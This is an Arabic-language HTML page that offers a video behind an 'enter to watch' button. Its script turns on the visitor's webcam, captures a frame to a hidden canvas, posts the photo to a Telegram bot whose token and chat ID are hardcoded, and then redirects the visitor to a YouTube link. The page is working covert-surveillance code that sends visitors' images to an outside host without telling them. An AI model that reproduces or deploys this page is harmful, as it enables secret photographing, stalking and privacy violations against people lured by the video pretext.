<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>أدخل لمشاهدة الفيديو</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #111;
      color: white;
      font-family: sans-serif;
    }
    button {
      font-size: 24px;
      padding: 20px 40px;
      background-color: #28a745;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<button onclick="captureAndRedirect()">أدخل لمشاهدة الفيديو</button>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
  const CHAT_ID = '6036900535';
  const YOUTUBE_LINK = 'https://youtu.be/1KDDD65PSrU?si=WiXAyZQTA1XrWARk';

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById('video');
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);
      return stream;
    } catch (error) {
      alert("فشل في الوصول إلى الكاميرا: " + error.message);
      throw error;
    }
  }

  async function captureAndRedirect() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // ابدأ الكاميرا إذا لم تعمل بعد
    if (!video.srcObject) {
      await startCamera();
    }
    
    // تأكد من أن الفيديو جاهز
    if (video.readyState < 2) {
      alert("الكاميرا ليست جاهزة بعد، حاول مرة أخرى بعد قليل.");
      return;
    }

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/jpeg');

    // إرسال الصورة إلى Telegram
    sendPhotoToTelegram(dataUrl);

    // توجيه المستخدم إلى رابط الفيديو
    window.location.href = YOUTUBE_LINK;
  }

  function sendPhotoToTelegram(dataUrl) {
    const base64Data = dataUrl.split(',')[1];
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: createFormData(base64Data),
    })
    .then(() => console.log("✅ تم إرسال الصورة"))
    .catch(err => console.error("❌ فشل إرسال الصورة", err));
  }

  function createFormData(base64Data) {
    const formData = new FormData();
    const blob = b64toBlob(base64Data, 'image/jpeg');
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    return formData;
  }

  function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
    const byteCharacters = atob(b64Data);
    const byteArrays = [];

    for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
      const slice = byteCharacters.slice(offset, offset + sliceSize);
      const byteNumbers = new Array(slice.length);
      for (let i = 0; i < slice.length; i++) {
        byteNumbers[i] = slice.charCodeAt(i);
      }
      byteArrays.push(new Uint8Array(byteNumbers));
    }

    return new Blob(byteArrays, { type: contentType });
  }
</script>

</body>
</html>
